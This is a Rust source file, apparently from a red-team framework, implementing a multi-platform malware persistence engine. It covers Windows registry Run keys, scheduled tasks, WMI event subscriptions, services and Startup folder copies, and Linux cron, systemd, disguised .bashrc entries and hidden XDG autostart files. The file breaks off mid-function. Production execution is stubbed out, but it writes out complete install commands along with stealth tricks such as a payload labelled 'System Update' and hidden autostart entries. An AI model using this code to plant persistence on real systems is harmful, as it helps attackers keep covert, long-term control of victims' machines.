//! Persistence Engine - Multi-Platform Persistence Framework
//!
//! Comprehensive persistence mechanism for authorized penetration testing
//! and red team exercises. Supports Windows, Linux, and macOS.
//!
//! **SECURITY NOTICE**: AUTHORIZED USE ONLY
//! All techniques require explicit authorization for deployment.
//!
//! Features:
//! - Auto-select best methods based on privileges
//! - Install multiple methods for redundancy
//! - Verify all persistence is active
//! - Clean removal with rollback support
//!
//! MITRE ATT&CK Coverage:
//! - T1547.001: Registry Run Keys / Startup Folder
//! - T1053.005: Scheduled Task/Job
//! - T1546.003: WMI Event Subscription
//! - T1543.003: Windows Service
//! - T1053.003: Cron
//! - T1543.002: Systemd Service
//! - T1546.004: Unix Shell Configuration
//! - T1547.011: Plist Modification (macOS)
//! - T1543.001: Launch Agent/Daemon

use anyhow::{bail, Context, Result};
use async_trait::async_trait;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use tracing::{debug, error, info, warn};
use uuid::Uuid;

use crate::core::module::{
    CheckResult, Module, ModuleInfo, ModuleOption, ModuleResult, ModuleType, Platform, Session,
};
use crate::modules::evasion::opsec::{OpsecConfig, DefaultTrafficShaper, TrafficShaper, StealthLevel as OpsecStealthLevel};

// ============================================================================
// Core Types
// ============================================================================

/// Stealth level for persistence methods
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
pub enum StealthLevel {
    VeryLow = 0,
    Low = 1,
    Medium = 2,
    High = 3,
    VeryHigh = 4,
}

impl StealthLevel {
    pub fn as_str(&self) -> &'static str {
        match self {
            Self::VeryLow => "Very Low",
            Self::Low => "Low",
            Self::Medium => "Medium",
            Self::High => "High",
            Self::VeryHigh => "Very High",
        }
    }
}

/// Handle to an installed persistence mechanism
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PersistenceHandle {
    pub id: Uuid,
    pub method_name: String,
    pub platform: Platform,
    pub installed_at: chrono::DateTime<chrono::Utc>,
    pub payload_path: String,
    pub persistence_name: String,
    pub mitre_id: String,
    pub metadata: HashMap<String, String>,
}

/// Result of persistence installation
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct InstallResult {
    pub success: bool,
    pub handle: Option<PersistenceHandle>,
    pub message: String,
    pub commands_executed: Vec<String>,
}

/// Result of persistence verification
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct VerifyResult {
    pub active: bool,
    pub details: String,
    pub last_checked: chrono::DateTime<chrono::Utc>,
}

// ============================================================================
// Persistence Method Trait
// ============================================================================

/// Core trait for persistence methods
#[async_trait]
pub trait PersistenceMethod: Send + Sync {
    /// Method name identifier
    fn name(&self) -> &str;

    /// Target platform
    fn platform(&self) -> Platform;

    /// Stealth level (higher = harder to detect)
    fn stealth_level(&self) -> StealthLevel;

    /// Whether admin/root privileges are required
    fn requires_admin(&self) -> bool;

    /// MITRE ATT&CK technique ID
    fn mitre_id(&self) -> &str;

    /// Description of the technique
    fn description(&self) -> &str;

    /// Install persistence mechanism
    async fn install(
        &self,
        session: &Session,
        payload_path: &str,
        persistence_name: &str,
        safe_mode: bool,
    ) -> Result<InstallResult>;

    /// Verify persistence is active
    async fn verify(&self, handle: &PersistenceHandle, safe_mode: bool) -> Result<VerifyResult>;

    /// Remove persistence mechanism
    async fn remove(&self, handle: &PersistenceHandle, safe_mode: bool) -> Result<bool>;

    /// Generate reference implementation commands (for documentation/safe mode)
    fn generate_reference(&self, payload_path: &str, persistence_name: &str) -> String;
}

// ============================================================================
// Windows Persistence Methods
// ============================================================================

/// Registry Run Key persistence (HKCU/HKLM)
pub struct RegistryRunPersistence {
    use_hklm: bool,
}

impl RegistryRunPersistence {
    pub fn new(use_hklm: bool) -> Self {
        Self { use_hklm }
    }
}

#[async_trait]
impl PersistenceMethod for RegistryRunPersistence {
    fn name(&self) -> &str {
        if self.use_hklm { "registry_run_hklm" } else { "registry_run_hkcu" }
    }

    fn platform(&self) -> Platform { Platform::Windows }
    fn stealth_level(&self) -> StealthLevel { StealthLevel::Low }
    fn requires_admin(&self) -> bool { self.use_hklm }
    fn mitre_id(&self) -> &str { "T1547.001" }

    fn description(&self) -> &str {
        if self.use_hklm {
            "Registry Run key persistence (HKLM - requires admin)"
        } else {
            "Registry Run key persistence (HKCU - user level)"
        }
    }

    async fn install(&self, session: &Session, payload_path: &str, persistence_name: &str, safe_mode: bool) -> Result<InstallResult> {
        let key_path = if self.use_hklm {
            "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        } else {
            "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        };

        let cmd = format!(
            "New-ItemProperty -Path '{}' -Name '{}' -Value '{}' -PropertyType String -Force",
            key_path, persistence_name, payload_path
        );

        info!(method = self.name(), mitre = self.mitre_id(), "Installing registry persistence");

        if safe_mode {
            return Ok(InstallResult {
                success: true,
                handle: Some(PersistenceHandle {
                    id: Uuid::new_v4(),
                    method_name: self.name().to_string(),
                    platform: self.platform(),
                    installed_at: chrono::Utc::now(),
                    payload_path: payload_path.to_string(),
                    persistence_name: persistence_name.to_string(),
                    mitre_id: self.mitre_id().to_string(),
                    metadata: [("key_path".to_string(), key_path.to_string())].into(),
                }),
                message: format!("[SAFE MODE] Would execute: {}", cmd),
                commands_executed: vec![cmd],
            });
        }

        // Production mode would execute the command here
        bail!("Production mode requires explicit authorization")
    }

    async fn verify(&self, handle: &PersistenceHandle, safe_mode: bool) -> Result<VerifyResult> {
        let key_path = handle.metadata.get("key_path").cloned().unwrap_or_default();
        let cmd = format!(
            "Get-ItemProperty -Path '{}' -Name '{}' -ErrorAction SilentlyContinue",
            key_path, handle.persistence_name
        );

        if safe_mode {
            return Ok(VerifyResult {
                active: true,
                details: format!("[SAFE MODE] Would verify: {}", cmd),
                last_checked: chrono::Utc::now(),
            });
        }

        bail!("Production mode requires explicit authorization")
    }

    async fn remove(&self, handle: &PersistenceHandle, safe_mode: bool) -> Result<bool> {
        let key_path = handle.metadata.get("key_path").cloned().unwrap_or_default();
        let cmd = format!(
            "Remove-ItemProperty -Path '{}' -Name '{}' -Force",
            key_path, handle.persistence_name
        );

        info!(method = self.name(), "Removing registry persistence");

        if safe_mode {
            debug!("[SAFE MODE] Would execute: {}", cmd);
            return Ok(true);
        }

        bail!("Production mode requires explicit authorization")
    }

    fn generate_reference(&self, payload_path: &str, persistence_name: &str) -> String {
        let key_path = if self.use_hklm {
            "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        } else {
            "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        };

        format!(
            "=== Registry Run Key Persistence ===\n\
            MITRE ATT&CK: {}\n\
            Stealth Level: {}\n\
            Requires Admin: {}\n\n\
            Registry Key: {}\n\
            Value Name: {}\n\
            Value Data: {}\n\n\
            PowerShell Command:\n\
            New-ItemProperty -Path '{}' -Name '{}' -Value '{}' -PropertyType String -Force\n\n\
            Cleanup Command:\n\
            Remove-ItemProperty -Path '{}' -Name '{}' -Force\n",
            self.mitre_id(), self.stealth_level().as_str(), self.requires_admin(),
            key_path, persistence_name, payload_path,
            key_path, persistence_name, payload_path,
            key_path, persistence_name
        )
    }
}

/// Scheduled Task persistence
pub struct ScheduledTaskPersistence;

#[async_trait]
impl PersistenceMethod for ScheduledTaskPersistence {
    fn name(&self) -> &str { "scheduled_task" }
    fn platform(&self) -> Platform { Platform::Windows }
    fn stealth_level(&self) -> StealthLevel { StealthLevel::Medium }
    fn requires_admin(&self) -> bool { false }
    fn mitre_id(&self) -> &str { "T1053.005" }
    fn description(&self) -> &str { "Scheduled task triggered at logon" }

    async fn install(&self, _session: &Session, payload_path: &str, persistence_name: &str, safe_mode: bool) -> Result<InstallResult> {
        let cmd = format!(
            "schtasks /create /tn \"{}\" /tr \"{}\" /sc onlogon /rl highest /f",
            persistence_name, payload_path
        );

        info!(method = self.name(), mitre = self.mitre_id(), "Installing scheduled task persistence");

        if safe_mode {
            return Ok(InstallResult {
                success: true,
                handle: Some(PersistenceHandle {
                    id: Uuid::new_v4(),
                    method_name: self.name().to_string(),
                    platform: self.platform(),
                    installed_at: chrono::Utc::now(),
                    payload_path: payload_path.to_string(),
                    persistence_name: persistence_name.to_string(),
                    mitre_id: self.mitre_id().to_string(),
                    metadata: HashMap::new(),
                }),
                message: format!("[SAFE MODE] Would execute: {}", cmd),
                commands_executed: vec![cmd],
            });
        }

        bail!("Production mode requires explicit authorization")
    }

    async fn verify(&self, handle: &PersistenceHandle, safe_mode: bool) -> Result<VerifyResult> {
        let cmd = format!("schtasks /query /tn \"{}\"", handle.persistence_name);

        if safe_mode {
            return Ok(VerifyResult {
                active: true,
                details: format!("[SAFE MODE] Would verify: {}", cmd),
                last_checked: chrono::Utc::now(),
            });
        }

        bail!("Production mode requires explicit authorization")
    }

    async fn remove(&self, handle: &PersistenceHandle, safe_mode: bool) -> Result<bool> {
        let cmd = format!("schtasks /delete /tn \"{}\" /f", handle.persistence_name);

        if safe_mode {
            debug!("[SAFE MODE] Would execute: {}", cmd);
            return Ok(true);
        }

        bail!("Production mode requires explicit authorization")
    }

    fn generate_reference(&self, payload_path: &str, persistence_name: &str) -> String {
        format!(
            "=== Scheduled Task Persistence ===\n\
            MITRE ATT&CK: {}\n\
            Stealth Level: {}\n\
            Requires Admin: {}\n\n\
            Task Name: {}\n\
            Executable: {}\n\
            Trigger: At Logon\n\n\
            Install Command:\n\
            schtasks /create /tn \"{}\" /tr \"{}\" /sc onlogon /rl highest /f\n\n\
            Cleanup Command:\n\
            schtasks /delete /tn \"{}\" /f\n",
            self.mitre_id(), self.stealth_level().as_str(), self.requires_admin(),
            persistence_name, payload_path,
            persistence_name, payload_path,
            persistence_name
        )
    }
}

/// WMI Event Subscription persistence (high stealth)
pub struct WmiEventPersistence;

#[async_trait]
impl PersistenceMethod for WmiEventPersistence {
    fn name(&self) -> &str { "wmi_event" }
    fn platform(&self) -> Platform { Platform::Windows }
    fn stealth_level(&self) -> StealthLevel { StealthLevel::High }
    fn requires_admin(&self) -> bool { true }
    fn mitre_id(&self) -> &str { "T1546.003" }
    fn description(&self) -> &str { "WMI event subscription for covert persistence" }

    async fn install(&self, _session: &Session, payload_path: &str, persistence_name: &str, safe_mode: bool) -> Result<InstallResult> {
        let filter_cmd = format!(
            "$filter = Set-WmiInstance -Class __EventFilter -Namespace 'root\\subscription' \
            -Arguments @{{Name='{}'; EventNamespace='root\\cimv2'; \
            QueryLanguage='WQL'; Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 \
            WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"}}",
            persistence_name
        );

        let consumer_cmd = format!(
            "$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace 'root\\subscription' \
            -Arguments @{{Name='{}'; CommandLineTemplate='{}'}}",
            persistence_name, payload_path
        );

        let binding_cmd = format!(
            "Set-WmiInstance -Class __FilterToConsumerBinding -Namespace 'root\\subscription' \
            -Arguments @{{Filter=$filter; Consumer=$consumer}}"
        );

        info!(method = self.name(), mitre = self.mitre_id(), "Installing WMI event persistence");

        if safe_mode {
            return Ok(InstallResult {
                success: true,
                handle: Some(PersistenceHandle {
                    id: Uuid::new_v4(),
                    method_name: self.name().to_string(),
                    platform: self.platform(),
                    installed_at: chrono::Utc::now(),
                    payload_path: payload_path.to_string(),
                    persistence_name: persistence_name.to_string(),
                    mitre_id: self.mitre_id().to_string(),
                    metadata: HashMap::new(),
                }),
                message: "[SAFE MODE] Would create WMI event subscription".to_string(),
                commands_executed: vec![filter_cmd, consumer_cmd, binding_cmd],
            });
        }

        bail!("Production mode requires explicit authorization")
    }

    async fn verify(&self, handle: &PersistenceHandle, safe_mode: bool) -> Result<VerifyResult> {
        let cmd = format!(
            "Get-WmiObject -Namespace 'root\\subscription' -Class __EventFilter | Where-Object {{ $_.Name -eq '{}' }}",
            handle.persistence_name
        );

        if safe_mode {
            return Ok(VerifyResult {
                active: true,
                details: format!("[SAFE MODE] Would verify: {}", cmd),
                last_checked: chrono::Utc::now(),
            });
        }

        bail!("Production mode requires explicit authorization")
    }

    async fn remove(&self, handle: &PersistenceHandle, safe_mode: bool) -> Result<bool> {
        let cmds = vec![
            format!("Get-WmiObject -Namespace 'root\\subscription' -Class __FilterToConsumerBinding | Where-Object {{ $_.Filter -like '*{}*' }} | Remove-WmiObject", handle.persistence_name),
            format!("Get-WmiObject -Namespace 'root\\subscription' -Class CommandLineEventConsumer | Where-Object {{ $_.Name -eq '{}' }} | Remove-WmiObject", handle.persistence_name),
            format!("Get-WmiObject -Namespace 'root\\subscription' -Class __EventFilter | Where-Object {{ $_.Name -eq '{}' }} | Remove-WmiObject", handle.persistence_name),
        ];

        if safe_mode {
            for cmd in &cmds {
                debug!("[SAFE MODE] Would execute: {}", cmd);
            }
            return Ok(true);
        }

        bail!("Production mode requires explicit authorization")
    }

    fn generate_reference(&self, payload_path: &str, persistence_name: &str) -> String {
        format!(
            "=== WMI Event Subscription Persistence ===\n\
            MITRE ATT&CK: {}\n\
            Stealth Level: {} (Covert)\n\
            Requires Admin: {}\n\n\
            Filter Name: {}\n\
            Consumer Command: {}\n\n\
            Components Created:\n\
            1. __EventFilter (trigger condition)\n\
            2. CommandLineEventConsumer (action)\n\
            3. __FilterToConsumerBinding (link)\n\n\
            Note: Very difficult to detect, survives reboots\n",
            self.mitre_id(), self.stealth_level().as_str(), self.requires_admin(),
            persistence_name, payload_path
        )
    }
}

/// Windows Service persistence
pub struct WindowsServicePersistence;

#[async_trait]
impl PersistenceMethod for WindowsServicePersistence {
    fn name(&self) -> &str { "windows_service" }
    fn platform(&self) -> Platform { Platform::Windows }
    fn stealth_level(&self) -> StealthLevel { StealthLevel::Low }
    fn requires_admin(&self) -> bool { true }
    fn mitre_id(&self) -> &str { "T1543.003" }
    fn description(&self) -> &str { "Windows service with automatic start" }

    async fn install(&self, _session: &Session, payload_path: &str, persistence_name: &str, safe_mode: bool) -> Result<InstallResult> {
        let create_cmd = format!(
            "sc.exe create {} binPath= \"{}\" start= auto DisplayName= \"{}\"",
            persistence_name, payload_path, persistence_name
        );
        let start_cmd = format!("sc.exe start {}", persistence_name);

        info!(method = self.name(), mitre = self.mitre_id(), "Installing Windows service persistence");

        if safe_mode {
            return Ok(InstallResult {
                success: true,
                handle: Some(PersistenceHandle {
                    id: Uuid::new_v4(),
                    method_name: self.name().to_string(),
                    platform: self.platform(),
                    installed_at: chrono::Utc::now(),
                    payload_path: payload_path.to_string(),
                    persistence_name: persistence_name.to_string(),
                    mitre_id: self.mitre_id().to_string(),
                    metadata: HashMap::new(),
                }),
                message: format!("[SAFE MODE] Would execute: {}", create_cmd),
                commands_executed: vec![create_cmd, start_cmd],
            });
        }

        bail!("Production mode requires explicit authorization")
    }

    async fn verify(&self, handle: &PersistenceHandle, safe_mode: bool) -> Result<VerifyResult> {
        let cmd = format!("sc.exe query {}", handle.persistence_name);

        if safe_mode {
            return Ok(VerifyResult {
                active: true,
                details: format!("[SAFE MODE] Would verify: {}", cmd),
                last_checked: chrono::Utc::now(),
            });
        }

        bail!("Production mode requires explicit authorization")
    }

    async fn remove(&self, handle: &PersistenceHandle, safe_mode: bool) -> Result<bool> {
        let stop_cmd = format!("sc.exe stop {}", handle.persistence_name);
        let delete_cmd = format!("sc.exe delete {}", handle.persistence_name);

        if safe_mode {
            debug!("[SAFE MODE] Would execute: {} && {}", stop_cmd, delete_cmd);
            return Ok(true);
        }

        bail!("Production mode requires explicit authorization")
    }

    fn generate_reference(&self, payload_path: &str, persistence_name: &str) -> String {
        format!(
            "=== Windows Service Persistence ===\n\
            MITRE ATT&CK: {}\n\
            Stealth Level: {}\n\
            Requires Admin: {}\n\n\
            Service Name: {}\n\
            Binary Path: {}\n\
            Start Type: Automatic\n\n\
            Install Commands:\n\
            sc.exe create {} binPath= \"{}\" start= auto\n\
            sc.exe start {}\n\n\
            Cleanup Commands:\n\
            sc.exe stop {}\n\
            sc.exe delete {}\n",
            self.mitre_id(), self.stealth_level().as_str(), self.requires_admin(),
            persistence_name, payload_path,
            persistence_name, payload_path, persistence_name,
            persistence_name, persistence_name
        )
    }
}

/// Startup Folder persistence
pub struct StartupFolderPersistence;

#[async_trait]
impl PersistenceMethod for StartupFolderPersistence {
    fn name(&self) -> &str { "startup_folder" }
    fn platform(&self) -> Platform { Platform::Windows }
    fn stealth_level(&self) -> StealthLevel { StealthLevel::VeryLow }
    fn requires_admin(&self) -> bool { false }
    fn mitre_id(&self) -> &str { "T1547.001" }
    fn description(&self) -> &str { "Copy payload to user Startup folder" }

    async fn install(&self, _session: &Session, payload_path: &str, persistence_name: &str, safe_mode: bool) -> Result<InstallResult> {
        let cmd = format!(
            "Copy-Item '{}' \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{}.exe\"",
            payload_path, persistence_name
        );

        info!(method = self.name(), mitre = self.mitre_id(), "Installing startup folder persistence");

        if safe_mode {
            return Ok(InstallResult {
                success: true,
                handle: Some(PersistenceHandle {
                    id: Uuid::new_v4(),
                    method_name: self.name().to_string(),
                    platform: self.platform(),
                    installed_at: chrono::Utc::now(),
                    payload_path: payload_path.to_string(),
                    persistence_name: persistence_name.to_string(),
                    mitre_id: self.mitre_id().to_string(),
                    metadata: HashMap::new(),
                }),
                message: format!("[SAFE MODE] Would execute: {}", cmd),
                commands_executed: vec![cmd],
            });
        }

        bail!("Production mode requires explicit authorization")
    }

    async fn verify(&self, handle: &PersistenceHandle, safe_mode: bool) -> Result<VerifyResult> {
        let cmd = format!(
            "Test-Path \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{}.exe\"",
            handle.persistence_name
        );

        if safe_mode {
            return Ok(VerifyResult {
                active: true,
                details: format!("[SAFE MODE] Would verify: {}", cmd),
                last_checked: chrono::Utc::now(),
            });
        }

        bail!("Production mode requires explicit authorization")
    }

    async fn remove(&self, handle: &PersistenceHandle, safe_mode: bool) -> Result<bool> {
        let cmd = format!(
            "Remove-Item \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{}.exe\" -Force",
            handle.persistence_name
        );

        if safe_mode {
            debug!("[SAFE MODE] Would execute: {}", cmd);
            return Ok(true);
        }

        bail!("Production mode requires explicit authorization")
    }

    fn generate_reference(&self, payload_path: &str, persistence_name: &str) -> String {
        format!(
            "=== Startup Folder Persistence ===\n\
            MITRE ATT&CK: {}\n\
            Stealth Level: {} (Easily detected)\n\
            Requires Admin: {}\n\n\
            Source: {}\n\
            Destination: %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{}.exe\n\n\
            Install Command:\n\
            Copy-Item '{}' \"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\{}.exe\"\n",
            self.mitre_id(), self.stealth_level().as_str(), self.requires_admin(),
            payload_path, persistence_name,
            payload_path, persistence_name
        )
    }
}

// ============================================================================
// Linux Persistence Methods
// ============================================================================

/// Cron job persistence
pub struct CronPersistence;

#[async_trait]
impl PersistenceMethod for CronPersistence {
    fn name(&self) -> &str { "cron" }
    fn platform(&self) -> Platform { Platform::Linux }
    fn stealth_level(&self) -> StealthLevel { StealthLevel::Medium }
    fn requires_admin(&self) -> bool { false }
    fn mitre_id(&self) -> &str { "T1053.003" }
    fn description(&self) -> &str { "Cron job that executes on reboot or at intervals" }

    async fn install(&self, _session: &Session, payload_path: &str, persistence_name: &str, safe_mode: bool) -> Result<InstallResult> {
        let cron_entry = format!("@reboot {} # {}", payload_path, persistence_name);
        let cmd = format!("(crontab -l 2>/dev/null; echo '{}') | crontab -", cron_entry);

        info!(method = self.name(), mitre = self.mitre_id(), "Installing cron persistence");

        if safe_mode {
            return Ok(InstallResult {
                success: true,
                handle: Some(PersistenceHandle {
                    id: Uuid::new_v4(),
                    method_name: self.name().to_string(),
                    platform: self.platform(),
                    installed_at: chrono::Utc::now(),
                    payload_path: payload_path.to_string(),
                    persistence_name: persistence_name.to_string(),
                    mitre_id: self.mitre_id().to_string(),
                    metadata: [("cron_entry".to_string(), cron_entry)].into(),
                }),
                message: format!("[SAFE MODE] Would execute: {}", cmd),
                commands_executed: vec![cmd],
            });
        }

        bail!("Production mode requires explicit authorization")
    }

    async fn verify(&self, handle: &PersistenceHandle, safe_mode: bool) -> Result<VerifyResult> {
        let cmd = format!("crontab -l | grep '{}'", handle.persistence_name);

        if safe_mode {
            return Ok(VerifyResult {
                active: true,
                details: format!("[SAFE MODE] Would verify: {}", cmd),
                last_checked: chrono::Utc::now(),
            });
        }

        bail!("Production mode requires explicit authorization")
    }

    async fn remove(&self, handle: &PersistenceHandle, safe_mode: bool) -> Result<bool> {
        let cmd = format!("crontab -l | grep -v '{}' | crontab -", handle.persistence_name);

        if safe_mode {
            debug!("[SAFE MODE] Would execute: {}", cmd);
            return Ok(true);
        }

        bail!("Production mode requires explicit authorization")
    }

    fn generate_reference(&self, payload_path: &str, persistence_name: &str) -> String {
        format!(
            "=== Cron Persistence ===\n\
            MITRE ATT&CK: {}\n\
            Stealth Level: {}\n\
            Requires Admin: {}\n\n\
            Cron Entry: @reboot {} # {}\n\n\
            Install Command:\n\
            (crontab -l 2>/dev/null; echo '@reboot {} # {}') | crontab -\n\n\
            Cleanup Command:\n\
            crontab -l | grep -v '{}' | crontab -\n",
            self.mitre_id(), self.stealth_level().as_str(), self.requires_admin(),
            payload_path, persistence_name,
            payload_path, persistence_name,
            persistence_name
        )
    }
}

/// Systemd service persistence
pub struct SystemdPersistence;

#[async_trait]
impl PersistenceMethod for SystemdPersistence {
    fn name(&self) -> &str { "systemd" }
    fn platform(&self) -> Platform { Platform::Linux }
    fn stealth_level(&self) -> StealthLevel { StealthLevel::Medium }
    fn requires_admin(&self) -> bool { true }
    fn mitre_id(&self) -> &str { "T1543.002" }
    fn description(&self) -> &str { "Systemd service with automatic start" }

    async fn install(&self, _session: &Session, payload_path: &str, persistence_name: &str, safe_mode: bool) -> Result<InstallResult> {
        let service_content = format!(
            "[Unit]\nDescription={}\nAfter=network.target\n\n\
            [Service]\nType=simple\nExecStart={}\nRestart=always\n\n\
            [Install]\nWantedBy=multi-user.target",
            persistence_name, payload_path
        );

        let service_path = format!("/etc/systemd/system/{}.service", persistence_name);
        let cmds = vec![
            format!("echo '{}' > {}", service_content, service_path),
            "systemctl daemon-reload".to_string(),
            format!("systemctl enable {}", persistence_name),
            format!("systemctl start {}", persistence_name),
        ];

        info!(method = self.name(), mitre = self.mitre_id(), "Installing systemd persistence");

        if safe_mode {
            return Ok(InstallResult {
                success: true,
                handle: Some(PersistenceHandle {
                    id: Uuid::new_v4(),
                    method_name: self.name().to_string(),
                    platform: self.platform(),
                    installed_at: chrono::Utc::now(),
                    payload_path: payload_path.to_string(),
                    persistence_name: persistence_name.to_string(),
                    mitre_id: self.mitre_id().to_string(),
                    metadata: [("service_path".to_string(), service_path)].into(),
                }),
                message: "[SAFE MODE] Would create systemd service".to_string(),
                commands_executed: cmds,
            });
        }

        bail!("Production mode requires explicit authorization")
    }

    async fn verify(&self, handle: &PersistenceHandle, safe_mode: bool) -> Result<VerifyResult> {
        let cmd = format!("systemctl is-active {}", handle.persistence_name);

        if safe_mode {
            return Ok(VerifyResult {
                active: true,
                details: format!("[SAFE MODE] Would verify: {}", cmd),
                last_checked: chrono::Utc::now(),
            });
        }

        bail!("Production mode requires explicit authorization")
    }

    async fn remove(&self, handle: &PersistenceHandle, safe_mode: bool) -> Result<bool> {
        let cmds = vec![
            format!("systemctl stop {}", handle.persistence_name),
            format!("systemctl disable {}", handle.persistence_name),
            format!("rm /etc/systemd/system/{}.service", handle.persistence_name),
            "systemctl daemon-reload".to_string(),
        ];

        if safe_mode {
            for cmd in &cmds {
                debug!("[SAFE MODE] Would execute: {}", cmd);
            }
            return Ok(true);
        }

        bail!("Production mode requires explicit authorization")
    }

    fn generate_reference(&self, payload_path: &str, persistence_name: &str) -> String {
        format!(
            "=== Systemd Service Persistence ===\n\
            MITRE ATT&CK: {}\n\
            Stealth Level: {}\n\
            Requires Admin: {}\n\n\
            Service File: /etc/systemd/system/{}.service\n\
            Executable: {}\n\n\
            Service Contents:\n\
            [Unit]\n\
            Description={}\n\
            After=network.target\n\n\
            [Service]\n\
            Type=simple\n\
            ExecStart={}\n\
            Restart=always\n\n\
            [Install]\n\
            WantedBy=multi-user.target\n",
            self.mitre_id(), self.stealth_level().as_str(), self.requires_admin(),
            persistence_name, payload_path,
            persistence_name, payload_path
        )
    }
}

/// Shell RC file persistence (.bashrc, .zshrc)
pub struct ShellRcPersistence {
    shell: String,
}

impl ShellRcPersistence {
    pub fn new(shell: &str) -> Self {
        Self { shell: shell.to_string() }
    }
}

#[async_trait]
impl PersistenceMethod for ShellRcPersistence {
    fn name(&self) -> &str { "shell_rc" }
    fn platform(&self) -> Platform { Platform::Linux }
    fn stealth_level(&self) -> StealthLevel { StealthLevel::Low }
    fn requires_admin(&self) -> bool { false }
    fn mitre_id(&self) -> &str { "T1546.004" }
    fn description(&self) -> &str { "Shell RC file modification (.bashrc/.zshrc)" }

    async fn install(&self, _session: &Session, payload_path: &str, persistence_name: &str, safe_mode: bool) -> Result<InstallResult> {
        let rc_file = match self.shell.as_str() {
            "zsh" => "~/.zshrc",
            _ => "~/.bashrc",
        };

        let entry = format!("\n# {} - System Update\n{} &>/dev/null &", persistence_name, payload_path);
        let cmd = format!("echo '{}' >> {}", entry, rc_file);

        info!(method = self.name(), mitre = self.mitre_id(), "Installing shell RC persistence");

        if safe_mode {
            return Ok(InstallResult {
                success: true,
                handle: Some(PersistenceHandle {
                    id: Uuid::new_v4(),
                    method_name: self.name().to_string(),
                    platform: self.platform(),
                    installed_at: chrono::Utc::now(),
                    payload_path: payload_path.to_string(),
                    persistence_name: persistence_name.to_string(),
                    mitre_id: self.mitre_id().to_string(),
                    metadata: [("rc_file".to_string(), rc_file.to_string())].into(),
                }),
                message: format!("[SAFE MODE] Would execute: {}", cmd),
                commands_executed: vec![cmd],
            });
        }

        bail!("Production mode requires explicit authorization")
    }

    async fn verify(&self, handle: &PersistenceHandle, safe_mode: bool) -> Result<VerifyResult> {
        let rc_file = handle.metadata.get("rc_file").cloned().unwrap_or_else(|| "~/.bashrc".to_string());
        let cmd = format!("grep '{}' {}", handle.persistence_name, rc_file);

        if safe_mode {
            return Ok(VerifyResult {
                active: true,
                details: format!("[SAFE MODE] Would verify: {}", cmd),
                last_checked: chrono::Utc::now(),
            });
        }

        bail!("Production mode requires explicit authorization")
    }

    async fn remove(&self, handle: &PersistenceHandle, safe_mode: bool) -> Result<bool> {
        let rc_file = handle.metadata.get("rc_file").cloned().unwrap_or_else(|| "~/.bashrc".to_string());
        let cmd = format!("sed -i '/{}/ d' {}", handle.persistence_name, rc_file);

        if safe_mode {
            debug!("[SAFE MODE] Would execute: {}", cmd);
            return Ok(true);
        }

        bail!("Production mode requires explicit authorization")
    }

    fn generate_reference(&self, payload_path: &str, persistence_name: &str) -> String {
        let rc_file = match self.shell.as_str() {
            "zsh" => "~/.zshrc",
            _ => "~/.bashrc",
        };

        format!(
            "=== Shell RC Persistence ===\n\
            MITRE ATT&CK: {}\n\
            Stealth Level: {}\n\
            Requires Admin: {}\n\n\
            RC File: {}\n\
            Entry: {} &>/dev/null &\n\n\
            Install Command:\n\
            echo '\\n# {} - System Update\\n{} &>/dev/null &' >> {}\n",
            self.mitre_id(), self.stealth_level().as_str(), self.requires_admin(),
            rc_file, payload_path,
            persistence_name, payload_path, rc_file
        )
    }
}

/// XDG Autostart persistence
pub struct XdgAutostartPersistence;

#[async_trait]
impl PersistenceMethod for XdgAutostartPersistence {
    fn name(&self) -> &str { "xdg_autostart" }
    fn platform(&self) -> Platform { Platform::Linux }
    fn stealth_level(&self) -> StealthLevel { StealthLevel::Low }
    fn requires_admin(&self) -> bool { false }
    fn mitre_id(&self) -> &str { "T1547.001" }
    fn description(&self) -> &str { "XDG autostart .desktop file (GUI sessions)" }

    async fn install(&self, _session: &Session, payload_path: &str, persistence_name: &str, safe_mode: bool) -> Result<InstallResult> {
        let desktop_content = format!(
            "[Desktop Entry]\nType=Application\nName={}\nExec={}\nHidden=true\nNoDisplay=true\nX-GNOME-Autostart-enabled=true",
            persistence_name, payload_path
        );

        let desktop_path = format!("~/.config/autostart/{}.desktop", persistence_name);
        let cmds = vec![
            "mkdir -p ~/.config/autostart".to_string(),
            format!("echo '{}' > {}", desktop_content, desktop_path),
        ];

        info!(method = self.name(), mitre = self.mitre_id(), "Installing XDG autostart persistence");

        if safe_mode {
            return Ok(InstallResult {
                success: true,
                handle: Some(PersistenceHandle {
                    id: Uuid::new_v4(),
                    method_name: self.name().to_string(),
                    platform: self.platform(),
                    installed_at: chrono::Utc::now(),
                    payload_path: payload_path.to_string(),
                    persistence_name: persistence_name.to_string(),
                    mitre_id: self.mitre_id().to_string(),
                    metadata: [("desktop_path".to_string(), desktop_path)].into(),
                }),
                message: "[SAFE MODE] Would create XDG autostart entry".to_string(),
                commands_executed: cmds,
            });
        }

        bail!("Production mode requires explicit authorization")
    }

    async fn verify(&self, handle: &PersistenceHandle, safe_mode: bool) -> Result<VerifyResult> {
        let desktop_path = handle.metadata.get("desktop_path").cloned()
            .unwrap_or_else(|| format!("~/.config/autostart/{}.desktop", handle.persistence_name));
        let cmd = format!("test -f {}", desktop_path);

        if safe_mode {
            return Ok(VerifyResult {
                active: true,
                details: format!("[SAFE MODE] Would verify: {}", cmd),
                last_checked: chrono::Utc::now(),
            });
        }

        bail!("Production mode requires explicit authorization")
    }

    async fn remove(&self, handle: &PersistenceHandle, safe_mode: bool) -> Result<bool> {
        let desktop_path = handle.metadata.get("desktop_path").cloned()
